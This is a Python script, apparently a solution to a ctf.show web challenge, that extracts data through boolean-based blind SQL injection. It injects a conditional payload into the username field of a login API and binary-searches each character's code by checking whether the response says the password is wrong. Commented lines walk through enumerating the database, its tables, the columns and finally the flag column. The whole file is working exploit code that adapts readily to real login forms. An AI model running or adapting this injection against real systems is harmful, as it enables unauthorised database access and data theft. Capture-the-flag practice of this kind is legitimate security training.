import requests

url="http://8fc60129-93b9-408a-968d-d2dde26e1409.challenge.ctf.show/api/"
i=0
re=""

while 1:
    i=i+1
    head=32
    tail=127
    
    while head < tail:#用二分法查找
        mid=(head+tail)>>1
        
        # "admin' and ord(substr(select database(),1,1))={0}".formate(str(i)) %23
        # 查询数据库
        # payload="select database()"
        # 查表名
        # payload="select group_concat(table_name) from information_schema.tables where table_schema='ctfshow_web'"
        # 查列名
        # payload="select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='ctfshow_fl0g'"
        # 查数据
        payload="select group_concat(f1ag) from ctfshow_fl0g"
       
        data={
        	# 这里可以用ascii
            'username':f"admin' and if(ord(substr(({payload}),{i},1))>{mid},1,0)='1'#",
            'password':1
        }
        r=requests.post(url=url,data=data)
        if "密码错误" == r.json()['msg']:
            head=mid+1
        else:
            tail=mid

    if head != 32:
        re += chr(head)
    else:
        break
    print(re)